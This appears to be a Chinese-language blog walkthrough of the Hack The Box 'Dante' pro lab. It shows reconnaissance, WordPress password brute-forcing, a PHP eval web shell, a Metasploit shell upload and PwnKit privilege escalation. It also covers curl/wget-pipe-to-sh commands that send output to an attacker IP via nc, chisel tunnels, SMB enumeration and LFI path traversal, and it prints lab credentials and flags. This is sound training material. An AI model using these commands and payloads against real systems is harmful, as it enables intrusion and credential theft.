---
title: HTB Prolab Dante walkthrough
date: 2024-01-02 10:29:48
categories:
- Pentest
tags:
- HTB
- MS17-010
- LPE
image:
  path: /assets/images/htb-pro-donat.png

toc: true
---
<!-- ![20240102074246](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102074246.png) -->
<!-- ![Alt text](../../../../../assets/image-12.png) -->

## 信息收集
### fscan
```bash
└─$ fscan -h 10.10.110.0/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 10.10.110.2     is alive
(icmp) Target 10.10.110.100   is alive
[*] Icmp alive hosts len is: 2
10.10.110.100:21 open
10.10.110.100:22 open
[*] alive ports len is: 2
start vulscan
[+] ftp://10.10.110.100:21:anonymous 
```
存活主机：
- 10.10.110.2
- 10.10.110.100

ftp://10.10.110.100:21 允许匿名登陆。

对 10.10.110.100 进行全端口扫描，注意需要加上 sudo，
```bash
sudo nmap -T4 -sC -sV -p- --min-rate=1000 10.10.110.100
```
nmap 扫描结果中有一个 flag，65000 开放了一个 apache2，上面运行了一个 wordpress 服务。
```bash
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
### ftp 匿名登陆
ftp 允许匿名登陆，一开始会出现：
```bash
229 Entering Extended Passive Mode (|||58413|)
```
等待一段时间后可以正常执行命令。Transfer/Incoming 中有一个 todo.txt

内容如下：
```bash
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
```


### wordpress 后台 getshell

![20240102074942](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102074942.png)


<!-- ![Alt text](../../../../../assets/image-1.png) -->

使用 wpscan 扫描。
```bash
wpscan --url http://10.10.110.100:65000/wordpress --enumerate
```
版本为 WordPress version 5.4.1，没有找到存在漏洞的插件，存在用户 admin 和 james。
```bash
[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
[+] Started: Fri Dec 22 22:12:24 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://10.10.110.100:65000/wordpress/?feed=atom, <generator uri="https://wordpress.org/" version="5.4.1">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-admin/load-styles.php, Match: '5.4.1'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```

todo.txt 中指出 james 的密码不太安全，可以考虑爆破 james 的密码。字典可以使用 rockyou.txt，但很久都没爆出来。
```bash
wpscan --url http://10.10.110.100:65000/wordpress -U james -P /webtools/dicts/rockyou.txt --proxy http://127.0.0.1:8080
```
参考 Tamarisk 的 writeup，也可以考虑使用页面的内容或者其他敏感内容生成字典，实在爆破不出来时可以考虑这种方法。cewl 是一个用于生成自定义单词列表的工具,可以爬取指定 URL 的网页内容，返回一个单词列表，用生成的字典爆破之后可以得到密码 Toyota。该密码也在 rockyou.txt ，但表单的爆破确实比较慢。
```bash
cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks > words.txt
```
以 james 用户进入后台后，james 正好属于 Administrator。Wordpress 后台 getshell 的相关利用方法可以参考：[Wordpress - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#plugin-rce)，主要有以下的几种方法：
1. 修改主题模板。
2. 修改插件文件。
3. 上传插件。

访问 /wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty 修改 404.php。添加一句话：
```php
eval($_POST["pass"]);
```
但保存时得到`Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.` 的错误，该报错是 Wordpress 4.9 之后添加的功能，会在 WP 文件编辑器中无法修改 php 文件。

使用 Plugin Editor 修改插件文件时可以正常保存，例如修改 akismet/class.akismet-cli.php。修改后访问：/wordpress/wp-content/plugins/akismet/class.akismet-cli.php 即可。

MSF 中也集成了相关 exp，但好像没法正常上传 payload。
```bash
use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.5
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lport 3333
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD Toyota
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME james
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 10.10.110.100
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rport 65000
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit 

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Authenticating with WordPress using james:Toyota...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/bpjosOzqKn/skfipPVLfx.php...
[!] This exploit may require manual cleanup of 'skfipPVLfx.php' on the target
[!] This exploit may require manual cleanup of 'bpjosOzqKn.php' on the target
[!] This exploit may require manual cleanup of '../bpjosOzqKn' on the target
[*] Exploit completed, but no session was created.
```

获取到 webshell 之后开始本地环境的信息收集。
- 内网 ip 172.16.1.100, 网关 172.16.1.1，其他主机 172.16.1.20 
- 本地存在 mysql 服务。可以在 wp-config 中拿到用户名密码：shaun/password，但数据库中似乎没有什么有用的信息。
    ```php
        define( 'DB_NAME', 'wordpress' );

        /** MySQL database username */
        define( 'DB_USER', 'shaun' );

        /** MySQL database password */
        define( 'DB_PASSWORD', 'password' );
    ```
- james 用户目录下有一个 flag.txt，但仅能够以 james 用户的身份读取。可以想办法获取 james 用户的密码，或者提权到 root 后在切换到 james 用户。

### linux 提权
全面收集信息可以使用 linPEAS 或者 lse
```bash
## linPEAS
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 #Victim

## lse
nc -lvnp 9002 | tee lse.out #Host

bash <(wget -q -O - "http://10.10.14.5:9999/lse_cve.sh") -l1 -i | nc 10.10.14.5 9002 #Victim

bash <(wget -q -O - "http://10.10.14.5:9999/lse_cve.sh") -l2 -i | nc 10.10.14.5 9002 #Victim
```

除了 james 之外还有一个 balthazar 用户。linPEAS 在 james 的 bash_history 文件中找到了一个密码。
```bash
╔══════════╣ Searching passwords in history files
/home/james/.bash_history:rm .mysql_history
/home/james/.bash_history:mysql -u balthazar -p TheJoker12345!
```
使用该密码可以正常登陆 ssh，结合前面使用 linPEAS 的结果，目标存在多个提权漏洞：
```bash
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
```
使用 Pwnkit 可以成功提权到 root，从而可以读取 james 的 flag。
```bash
balthazar@DANTE-WEB-NIX01:~/Downloads/.tmp$ ./PwnKit 
root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp# whoami
root
root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp# cat /home/james/flag.txt 
DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}
root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp#
```
root 目录下也有一个 flag.txt
```bash
root@DANTE-WEB-NIX01:~# ls
flag.txt  snap  wordpress.tar.bz2  wordpress_backup
root@DANTE-WEB-NIX01:~# cat flag.txt 
DANTE{Too_much_Pr1v!!!!}
```

### Tunnel 搭建

#### chisel
使用 pwncat-cs 连接 ssh，上传 chisel
```bash
pwncat-cs 'ssh://balthazar:TheJoker12345!@10.10.110.100'
upload chisel xxx
```

首先使用 chisel 构建 socks 隧道。
```bash
./chisel server -p 12345 --reverse # local
./chisel client 10.10.14.5:12345 R:0.0.0.0:1080:socks # remote
```
#### msf
也可以使用 msf meterpreter 来构建 socks 隧道：
```bash
use multi/manage/autoroute
set session 1
exploit
use auxiliary/server/socks_proxy
set SRVPORT 9090
exlpoit -j
```
	

### 内网资产扫描
在建立了隧道的基础上就可以对内网进行资产扫描了
#### fscan
比较高效的是 fscan，配合 fscanOutPut 可以将结果以表格的方式进行统计。fscan 支持 -socks5 参数来指定代理：
```bash
fscan -h 172.16.1.0/24 -socks5 127.0.0.1:1080
```

#### Goby
Goby 的图形化界面更加方便分析。代理扫描时，使用 socks 代理。

![20240102075033](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102075033.png)

<!-- ![Alt text](../../../../../assets/image-2.png) -->

总共 11 个 IP，同样也扫描出了 MS17-010

#### Ehole: 指纹识别
ehole 可以对 web 服务进行进一步的指纹扫描，同样支持 -socks 参数进行代理扫描。

```bash
ehole finger -l webapp.txt --proxy socks5://127.0.0.1:1080
```
![20240102075044](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102075044.png)

<!-- ![Alt text](../../../../../assets/image-4.png) -->
```bash
[ https://172.16.1.1 |  | nginx | 200 | 8889 | pfSense - LoginpfSense Logo ]
[ https://172.16.1.1/ |  | nginx | 200 | 8889 | pfSense - LoginpfSense Logo ]
[ http://172.16.1.1 |  | nginx | 200 | 8999 | pfSense - LoginpfSense Logo ]
[ http://172.16.1.102 | OpenSSL | Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0 | 200 | 1237 | Dante Marriage Registration System :: Home Page ]                                                                                       
[ http://172.16.1.19 | 列目录 | Apache/2.4.41 (Ubuntu) | 200 | 553 | Index of / ]
[ http://172.16.1.12/dashboard/ | XAMPP 默认页面,Perl,rums(科创站群管理平台),mod_perl,OpenSSL | Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP ]                            
[ http://172.16.1.17 | 列目录 | Apache/2.4.41 (Ubuntu) | 200 | 963 | Index of / ]
[ http://172.16.1.20 |  | Microsoft-IIS/8.5 | 200 | 3173 |  ]
[ http://172.16.1.100 | Apache2 Ubuntu 默认页 | Apache/2.4.41 (Ubuntu) | 200 | 10918 | Apache2 Ubuntu Default Page: It works ]                                                                                                          
[ http://172.16.1.13/dashboard/ | XAMPP 默认页面,rums(科创站群管理平台),OpenSSL | Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP ]                                                                      
[ http://172.16.1.10 | wordpress | Apache/2.4.41 (Ubuntu) | 200 | 28842 | Dante Hosting ]
[ https://172.16.1.102 | OpenSSL | Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0 | 200 | 1237 | Dante Marriage Registration System :: Home Page ]                                                                                      
[ https://172.16.1.13/dashboard/ | XAMPP 默认页面,rums(科创站群管理平台),OpenSSL | Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP ]                                                                     
[ https://172.16.1.12/dashboard/ | XAMPP 默认页面,Perl,rums(科创站群管理平台),mod_perl,OpenSSL | Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP ]                           
[ http://172.16.1.12 | XAMPP 默认页面,Perl,rums(科创站群管理平台),mod_perl,OpenSSL | Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP ]                                       
[ http://172.16.1.13 | XAMPP 默认页面,rums(科创站群管理平台),OpenSSL | Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP ]                                                                                 
[ https://172.16.1.13 | XAMPP 默认页面,rums(科创站群管理平台),OpenSSL | Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP ]                                                                                
[ https://172.16.1.12 | XAMPP 默认页面,Perl,rums(科创站群管理平台),mod_perl,OpenSSL | Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP ]                                      
[ http://172.16.1.19:8080 | Jenkins,Hudson,Jenkins | Jetty(9.4.27.v20200227) | 403 | 793 |  ]
[ http://172.16.1.19:8080/login?from=%2F' | Jenkins,Hudson,Jenkins | Jetty(9.4.27.v20200227) | 200 | 2019 | Sign in [Jenkins] ]  
```

#### 资产概况

存活 IP 及端口：
  - 172.16.1.5 
        172.16.1.5  21
        172.16.1.5	135
        172.16.1.5	139
        172.16.1.5	445
        172.16.1.5	1433
  - 172.16.1.13
        172.16.1.13	80
        172.16.1.13	443
        172.16.1.13	445
  - 172.16.1.102
        172.16.1.102	80
        172.16.1.102	135
        172.16.1.102	139
        172.16.1.102	443
        172.16.1.102	445
        172.16.1.102	3306

  - 172.16.1.10
        172.16.1.10	22
        172.16.1.10	80
        172.16.1.10	139
        172.16.1.10	445
  - 172.16.1.17
        172.16.1.17	80
        172.16.1.17	139
        172.16.1.17	445
        172.16.1.17	10000
  - 172.16.1.101
        172.16.1.101	21
        172.16.1.101	135
        172.16.1.101	139
        172.16.1.101	445
  - 172.16.1.3	
        172.16.1.3	22
  - 172.16.1.20
        172.16.1.20	80
        172.16.1.20	22
        172.16.1.20	135
        172.16.1.20	139
        172.16.1.20	443
        172.16.1.20	445
        172.16.1.20	88
  - 172.16.1.19
        172.16.1.19	80
        172.16.1.19	8080
        172.16.1.19	8443
        172.16.1.19	8888

  - 172.16.1.12
        172.16.1.12	21
        172.16.1.12	80
        172.16.1.12	22
        172.16.1.12	443
        172.16.1.12	3306
  - 172.16.1.1
        172.16.1.1	22
        172.16.1.1	80
        172.16.1.1	443
  - 172.16.1.100
        172.16.1.100	22
        172.16.1.100	21
        172.16.1.100	80
  - 10.10.110.100
        10.10.110.100	21
        10.10.110.100	22

## 无凭证域内信息收集
1. cme 收集 SMB 及域信息。
2. 定位域控
3. 寻找域内用户名
4. 是否可以匿名枚举 SMB、FTP 等
5. ASREProast
6. Password Spray
7. 匿名枚举 ftp

### cme 收集 SMB 及域信息
```bash
p crackmapexec smb 172.16.1.0/24
```
结果如下：
```bash
SMB         172.16.1.5      445    DANTE-SQL01      [*] Windows Server 2016 Standard 14393 x64 (name:DANTE-SQL01) (domain:DANTE-SQL01) (signing:False) (SMBv1:True)
SMB         172.16.1.20     445    DANTE-DC01       [*] Windows Server 2012 R2 Standard 9600 x64 (name:DANTE-DC01) (domain:DANTE.local) (signing:True) (SMBv1:True)
SMB         172.16.1.10     445    DANTE-NIX02      [*] Windows 6.1 Build 0 (name:DANTE-NIX02) (domain:) (signing:False) (SMBv1:False)
SMB         172.16.1.17     445    DANTE-NIX03      [*] Windows 6.1 Build 0 (name:DANTE-NIX03) (domain:) (signing:False) (SMBv1:False)
SMB         172.16.1.101    445    DANTE-WS02       [*] Windows 10.0 Build 18362 x64 (name:DANTE-WS02) (domain:DANTE-WS02) (signing:False) (SMBv1:False)
SMB         172.16.1.102    445    DANTE-WS03       [*] Windows 10.0 Build 19041 x64 (name:DANTE-WS03) (domain:DANTE-WS03) (signing:False) (SMBv1:False)
SMB         172.16.1.13     445    DANTE-WS01       [*] Windows 10.0 Build 18362 (name:DANTE-WS01) (domain:DANTE-WS01) (signing:False) (SMBv1:False)
```
从结果中可以看到存在 DANTE.local 域，并且 DC 为 172.16.1.20。 
1. 前面的探测结果中可知 DC 上存在永恒之蓝漏洞。
2. 除了 DC 之外，其他的主机均未开启 SMB 强制签名，存在 Relay 的可能性。

### 匿名枚举用户名
匿名枚举用户名可以使用 cme 或者 enum4linux。

```bash
p crackmapexec smb 172.16.1.20 --users

p enum4linux 172.16.1.20 
```
需要认证，因此没有得到结果。
```
└─$ p crackmapexec smb 172.16.1.20 --users
[proxychains] config file found: /mnt/share/project/HTB/ProLab/Dante/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
SMB         172.16.1.20     445    DANTE-DC01       [*] Windows Server 2012 R2 Standard 9600 x64 (name:DANTE-DC01) (domain:DANTE.local) (signing:True) (SMBv1:True)
SMB         172.16.1.20     445    DANTE-DC01       [-] Error enumerating domain users using dc ip 172.16.1.20: NTLM needs domain\username and a password
SMB         172.16.1.20     445    DANTE-DC01       [*] Trying with SAMRPC protocol
```

### 匿名枚举 SMB
如果 SMB 允许匿名访问，我们没准可以获取一些敏感消息。
```bash
p crackmapexec smb 172.16.1.0/24 -u anonymous -p ''  --shares
```
结果如下：
```bash
SMB         172.16.1.5      445    DANTE-SQL01      [*] Windows Server 2016 Standard 14393 x64 (name:DANTE-SQL01) (domain:DANTE-SQL01) (signing:False) (SMBv1:True)
SMB         172.16.1.20     445    DANTE-DC01       [*] Windows Server 2012 R2 Standard 9600 x64 (name:DANTE-DC01) (domain:DANTE.local) (signing:True) (SMBv1:True)
SMB         172.16.1.10     445    DANTE-NIX02      [*] Windows 6.1 Build 0 (name:DANTE-NIX02) (domain:) (signing:False) (SMBv1:False)
SMB         172.16.1.17     445    DANTE-NIX03      [*] Windows 6.1 Build 0 (name:DANTE-NIX03) (domain:) (signing:False) (SMBv1:False)
SMB         172.16.1.5      445    DANTE-SQL01      [-] DANTE-SQL01\anonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.102    445    DANTE-WS03       [*] Windows 10.0 Build 19041 x64 (name:DANTE-WS03) (domain:DANTE-WS03) (signing:False) (SMBv1:False)
SMB         172.16.1.101    445    DANTE-WS02       [*] Windows 10.0 Build 18362 x64 (name:DANTE-WS02) (domain:DANTE-WS02) (signing:False) (SMBv1:False)
SMB         172.16.1.20     445    DANTE-DC01       [-] DANTE.local\anonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.10     445    DANTE-NIX02      [+] \anonymous: 
SMB         172.16.1.17     445    DANTE-NIX03      [+] \anonymous: 
SMB         172.16.1.10     445    DANTE-NIX02      [+] Enumerated shares
SMB         172.16.1.10     445    DANTE-NIX02      Share           Permissions     Remark
SMB         172.16.1.10     445    DANTE-NIX02      -----           -----------     ------
SMB         172.16.1.10     445    DANTE-NIX02      print$                          Printer Drivers
SMB         172.16.1.10     445    DANTE-NIX02      SlackMigration  READ            
SMB         172.16.1.10     445    DANTE-NIX02      IPC$                            IPC Service (DANTE-NIX02 server (Samba, Ubuntu))                                                                                                                    
SMB         172.16.1.13     445    DANTE-WS01       [*] Windows 10.0 Build 18362 (name:DANTE-WS01) (domain:DANTE-WS01) (signing:False) (SMBv1:False)
SMB         172.16.1.102    445    DANTE-WS03       [-] DANTE-WS03\anonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       [-] DANTE-WS02\anonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.17     445    DANTE-NIX03      [+] Enumerated shares
SMB         172.16.1.17     445    DANTE-NIX03      Share           Permissions     Remark
SMB         172.16.1.17     445    DANTE-NIX03      -----           -----------     ------
SMB         172.16.1.17     445    DANTE-NIX03      forensics       READ,WRITE      
SMB         172.16.1.17     445    DANTE-NIX03      IPC$                            IPC Service (DANTE-NIX03 server (Samba, Ubuntu))                                                                                                                    
SMB         172.16.1.13     445    DANTE-WS01       [-] DANTE-WS01\anonymous: STATUS_LOGON_FAILURE 
```
允许 SMB 匿名访问的有两台主机：
1. 172.16.1.10 SlackMigration 可读
2. 172.16.1.17 forensics 可读可写

我们可以使用 smbclient 进行连接。
```bash
p smbclient \\\\172.16.1.10\\SlackMigration -U "anonymous%"
```
172.16.1.10 中 SlackMigration 共享中存在一个 admintasks.txt 文件，相当于提示信息。
```bash
-Remove wordpress install from web root - PENDING
-Reinstate Slack integration on Ubuntu machine - PENDING
-Remove old employee accounts - COMPLETE
-Inform Margaret of the new changes - COMPLETE
-Remove account restrictions on Margarets account post-promotion to admin - PENDING
```
从中我们可以得出如下的信息：
- 172.16.1.10 中部署的 wordpress 服务以 root 权限运行。
- 用户 Margarets 具备管理员权限。

连接 172.16.1.17 forensics
```bash
p smbclient \\\\172.16.1.17\\forensics -U "anonymous%"
```
可以在其中发现一个 monitor 文件。
```bash
└─$ file monitor
monitor: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
```
monitor 是一个 pcap 文件，使用 wireshark 打开。过滤 http 报文可以发现流量中存在部分认证消息。
- admin/password6543
- admin/Password6543

![20231226023935](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231226023935.png)

<!-- ![Alt text](../../../../../assets/image-9.png) -->

## Linux: 172.16.1.10
### 80 端口文件包含导致 RCE
http://172.16.1.10/nav.php?page=about.html

page 参数存在目录穿越，导致任意文件读取。

```bash
http://172.16.1.10/nav.php?page=../../../../../../../etc/passwd
```
结果如下：
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
